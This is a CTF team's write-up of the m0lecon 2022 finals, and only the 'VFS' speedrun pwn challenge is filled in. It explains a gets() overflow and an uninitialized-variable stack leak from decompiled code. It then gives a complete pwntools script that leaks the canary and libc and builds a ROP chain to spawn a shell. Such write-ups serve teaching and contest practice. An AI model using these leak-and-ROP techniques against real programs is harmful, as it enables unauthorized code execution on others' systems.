---
title: "m0lecon finals 2022"
date: "2022-11-18"
tags: ["CTF", "m0lecon", "finals", "AttackDefence"]
---

# Attack Defence
TODO

# King Of The Hill (KOTH)
TODO

# Speedruns
The CTF featured a number of four speedrun challenges, which were Jeopardy-style challenges released every 2 hours. Unfortunately, we only solved the second one, but we got really close to solve the first one too!

Unfortunately, as the first one was related to making a scanner (which was on-site) scan an image, we cannot really try to solve it afterward the CTF ended 😔.

## VFS - Speedrun 2 ([kalex](/authors/kalex))

### Exploration
This pwn challenge was pretty interesting, as it was illustrating how it is (kinda) possible to use the stack to allocate memory dynamically (spoiler alert: don't ***ever*** do it for real). The binary and other files that came with it are available [here](/downloadables/m0lecon_finals_2022_vfs.zip).

The binaries' protections are the following (checksec output):
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The binary was fairly simple. The decompiled version from [Ghidra](https://ghidra-sre.org/) is the following:

```c
// This is actually not as complex as it looks, but as this
// function does not follow the normal calling convention and
// stack setup, Ghidra doesn't really understand what's going
// on really well
void demo(long size)
{
  long in_FS_OFFSET;
  long canary;
  long -size;
  
  -size = -size;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Please insert your string!");
  printf("> ");
  gets(&stack0x00000000 + -size);
  *(undefined *)((long)&canary + *(long *)(&stack0xfffffffffffffff8 + -size) + -size) = 0;
  print_result((long)&stack0x00000000 + -size);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void VFS(void)
{
  long in_FS_OFFSET;
  long size;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("How big of an array you want to make?");
  printf("> ");
  size = -1;
  __isoc99_scanf("%lu",&size);
  getchar();
  if ((size < 1) || (0x1ff < size)) {
    puts("Let\'s not break our necks here...");
  }
  else {
    size = (size - size % 0x10) + 0x20;
    demo(size);
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void stats(void)
{
  int choice;
  long in_FS_OFFSET;
  undefined8 rating;
  char local_178 [360];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  puts("Hello! This demo was proven faster than mallocs, in every test environment available.");
  puts("90% of the developers who used this app found this approach more useful than mallocs");
  puts("Our company found a 60% revenue increase after switching all our products to VSF");
  puts("You can get our VSF ready kit for only 13370$");
  puts("Can you please leave a rating? (y/n)");
  printf("> ");
  choice = getchar();
  getchar();
  if ((char)choice == 'y') {
    puts(
        "VFS allows us to have ratings between 0 and 18446744073709551615, unlike mallocs approaches , which is usually limited to 5 (in all testing environments)"
        );
    printf("> ");
    __isoc99_scanf("%lu",&rating);
    getchar();
  }
  else {
    puts("At least leave us a review pls");
    putchar(0x3e);
    fgets(local_178,0x15d,stdin);
  }
  printf("Your rating of %lu was recorded\n",rating);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void main(void)
{
  long in_FS_OFFSET;
  char choice;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setBuffs();
  puts("Welcome to VSF demo!");
  while( true ) {
    puts("Main menu");
    puts("1. Test variable size frames");
    puts("2. Print stats which proves this approach is better than malloc");
    puts("3. Exit");
    printf("> ");
    read(0,&choice,1);
    getchar();
    if (choice == '3') break;
    if (choice == '1') {
      VFS();
    }
    if (choice == '2') {
      stats();
    }
  }
  puts("Hope you enjoyed this demo, and please stop using malloc :)");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

If you are wondering what the `demo` function does, it is useful to look at the assembly. A standard function prologue looks like the following (intel syntax):
```asm
push   rbp
mov    rbp,rsp
sub    rsp,0x180
```
The space allocated on the stack for the local variables (using `sub rsp, <n>`) is statically defined. In `demo`, however, the prologue is the following:
```asm
push   rbp
mov    rbp,rsp
sub    rsp,rdi
```
where the space allocated is dynamically defined using `rdi`, which is the first argument passed to the function.

There are two vulnerabilities. The first one is obvious, and derives from the usage of `gets`. Notice, however, that we cannot leak the canary, as `gets` puts a null byte at the end of our input, preventing string-reading functions to leak it.

The second vulnerability is a little more subtle. Notice that the `rating` variable in `stats` is never initialized if we do not enter the if, but it still gets printed out anyway at the end. This means that we can leak stuff on the stack!

### Exploitation
We can use the second vulnerability to leak stuff from the binary. The easier way to see what we can get is to try every possible combination of calls to `VFS`, followed by a `stats`. In each `VFS` call, we will change the size of the stack allocation, therefore changing the stack (and possibly what's leaked by `stats`). 

We can then simply print out the leaks, find out what it prints (in this case, both the canary and a libc address is printed, allowing us to use the whole libc to pop a shell).

We can then simply build a ropchain to pop a shell using a one_gadget (and some gadgets to fulfill its constraints.

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./vfs_patched")
libc = ELF("./libc.so.6")

context.binary = exe
context.log_level = "debug"
context.terminal = ["kitty"]
io = None


def conn(*a, **kw):
    if args.GDB:
        return gdb.debug([exe.path], gdbscript="", **kw)
    else:
        return process([exe.path], **kw)


def vfs(size, data=b"A"):
    global io
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", data)


def stats():
    global io
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"n")
    io.sendlineafter(b">", b"AAAA")
    io.recvuntil(b"rating of ")
    return int(io.recvuntil(" ")[:-1])


def main():
    global io
    io = conn(level="debug")

    # good luck pwning :)
    # Bruteforce the possible leaks
    # for i in range(2, 0x200):
    #     vfs(i)
    #     print(i, hex(stats()))

    # Leak canary
    vfs(288)
    canary = stats()
    log.info(f"canary: {hex(canary)}")

    # Leak libc
    vfs(144)
    libc.address = stats() - 0x216600
    log.success(f"libc @ {hex(libc.address)}")

    # Get a shell
    # To use the one_gadget found, we need to set a couple of registers first

    # 0xebcf8 execve("/bin/sh", rsi, rdx)
    # constraints:
    #   address rbp-0x78 is writable
    #   [rsi] == NULL || rsi == NULL
    #   [rdx] == NULL || rdx == NULL
    rop = ROP(libc)
    rop.raw(libc.address + 0x00000000000DA97D)  # pop rsi; ret;
    rop.raw(0)
    rop.raw(libc.address + 0x000000000011F497)  # pop rdx; pop r12; ret
    rop.raw(0)
    rop.raw(0)
    rop.raw(libc.address + 0xEBCF8)

    payload = flat(
        b"A" * 16,  # padding
        canary,  # canary
        exe.bss(100),  # one_gadget also requires a writeable rbp - 0x78
        rop.chain(),  # rop chain
    )
    vfs(10, payload)

    io.interactive()


if __name__ == "__main__":
    main()
```
